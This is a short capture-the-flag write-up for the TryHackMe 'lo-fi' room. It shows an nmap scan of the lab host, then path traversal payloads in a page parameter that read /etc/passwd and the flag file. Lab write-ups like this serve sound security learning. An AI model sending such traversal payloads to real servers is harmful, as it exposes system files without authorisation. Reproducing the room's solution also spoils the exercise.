# TryHackMe lo-fi Writeup

---

## Nmap Scan

```
nmap -sCV -Pn 10.114.148.177
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-21 03:22 EST
Nmap scan report for 10.114.148.177
Host is up (0.083s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 09:22:5d:ce:1a:88:82:85:4f:0b:c6:1f:06:59:b9:bb (RSA)
|   256 73:7b:5f:e8:ac:4e:22:98:f6:e3:12:a2:67:84:c1:0c (ECDSA)
|_  256 62:71:a6:1d:2b:4f:a1:16:92:00:67:eb:e8:f8:75:0a (ED25519)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Lo-Fi Music
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds

```

----

```
http://10.114.148.177/
```

<img width="1411" height="683" alt="image" src="https://github.com/user-attachments/assets/d9da2ce4-0050-4b1b-b4d0-cc001a0d2c60" />

> ## click on any link 

```
http://10.114.148.177/?page=sleep.php
```

### let's try path traversal or lfi

```
http://10.114.148.177/?page=../../../../../../../../etc/passwd
```

<img width="1262" height="645" alt="image" src="https://github.com/user-attachments/assets/60ccffdf-6a72-4b41-933a-f94b4e43522c" />

### i try to read flag.txt

```
?page=../../../../../../flag.txt
```

<img width="977" height="346" alt="image" src="https://github.com/user-attachments/assets/95a1ebda-8a12-4b12-941e-ff7e1b22daf0" />

